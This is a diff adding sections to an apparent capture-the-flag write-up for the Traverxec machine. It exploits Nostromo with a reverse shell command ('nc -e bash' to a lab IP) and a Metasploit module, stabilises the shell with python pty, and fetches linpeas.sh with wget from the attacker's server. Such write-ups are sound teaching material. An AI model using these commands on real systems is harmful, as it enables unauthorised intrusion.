@@ -90,8 +90,56 @@ python 47837.py "nc -e bash 10.10.10.165 9001"
 And........ We get a shell
 
 ---
-
 # Metasploit
 
+Now that we've manually exploited Nostromo, let's automate it with `Metasploit`.
 
+```bash
+msfconsole
+msf > use exploit/multi/htto/nostromo_code_exec
+msf > set rhost 10.10.10.165
+msf > set lhost 10.10.14.40
+msf > run
+```
+> *Make sure you set lhost to YOUR machines IP.*
 
+![Metasploit](/images/traverxec/metasploit.png)
+
+After we fire off the exploit, we get a shell:
+
+![Metasploit-Shell](/images/traverxec/meta-shell.png)
+
+---
+# Stabelize Shell
+Let's move forward with our manual shell. But first, we need to stabelize it. I don't know about you, but I can't live without TAB auto-cmplete!
+
+The target machine is Linux, so it *SHOULD* have `Python` installed, but lets check anyway.
+
+```bash
+which python
+/usr/bin/python
+```
+*Let's spawn a TTY shell!* 
+
+```bash
+python -c 'import pty;pty.spawn("/bin/bash")'
+ctrl+z (to background)
+stty raw -echo
+fg [enter] (to send to foreground)
+```
+We should now have a stable shell!
+
+---
+# Target Enumeration
+
+I think it's important to always have some sort of enumeration running while we're working. So, one of the first things I do on a box is to get some sort of automated enuermation running. For Linux, I like to use `Linpeas`. There's a couple of ways we can get this onto the box, but normally I'll just `wget` it from my kali box.
+
+*On my Kali box, in the Linpease directory*
+```bash
+python -m SimpleHTTPServer
+```
+
+*On Target Machine*
+```bash
+wget 10.10.14.10:8080/linpeas.sh
+```
